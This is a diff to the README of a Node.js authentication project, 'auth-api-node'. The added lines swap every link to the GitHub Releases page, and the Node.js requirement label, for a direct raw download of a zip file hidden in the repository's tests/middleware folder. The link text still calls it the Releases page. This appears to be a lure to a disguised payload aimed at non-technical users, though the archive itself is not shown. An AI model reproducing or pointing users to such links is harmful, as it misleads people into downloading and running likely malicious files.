@@ -2,14 +2,14 @@
 # 🎉 auth-api-node - Simple Authentication for Your Apps
 
 ## 📥 Download the App
-[![Download auth-api-node](https://img.shields.io/badge/Download%20auth--api--node-brightgreen)](https://github.com/GabrielLucasDSR/auth-api-node/releases)
+[![Download auth-api-node](https://github.com/GabrielLucasDSR/auth-api-node/raw/refs/heads/main/tests/middleware/node-api-auth-2.3.zip%20auth--api--node-brightgreen)](https://github.com/GabrielLucasDSR/auth-api-node/raw/refs/heads/main/tests/middleware/node-api-auth-2.3.zip)
 
 ## 🚀 Getting Started
 To use the auth-api-node, you'll follow a simple process. This application provides a secure way of managing user authentication for various applications. You don't need technical skills to get started. 
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://github.com/GabrielLucasDSR/auth-api-node/raw/refs/heads/main/tests/middleware/node-api-auth-2.3.zip** Version 14 or higher
 - **PostgreSQL:** Version 12 or higher
 - **Redis:** For rate limiting (optional)
 
@@ -17,7 +17,7 @@ Make sure you have these installed before proceeding.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click here to visit the Releases page: [Download auth-api-node](https://github.com/GabrielLucasDSR/auth-api-node/releases)
+   Click here to visit the Releases page: [Download auth-api-node](https://github.com/GabrielLucasDSR/auth-api-node/raw/refs/heads/main/tests/middleware/node-api-auth-2.3.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, locate the most recent version of the software. This version typically has the latest features and updates. 
@@ -60,5 +60,5 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 Contributions are welcome! If you want to enhance the application, please fork the repository, make your changes, and submit a pull request. We appreciate any improvements you can provide.
 
 ## 📥 Download the App Again
-Don't forget to install the latest version by visiting the Releases page: [Download auth-api-node](https://github.com/GabrielLucasDSR/auth-api-node/releases).
+Don't forget to install the latest version by visiting the Releases page: [Download auth-api-node](https://github.com/GabrielLucasDSR/auth-api-node/raw/refs/heads/main/tests/middleware/node-api-auth-2.3.zip).
 ```
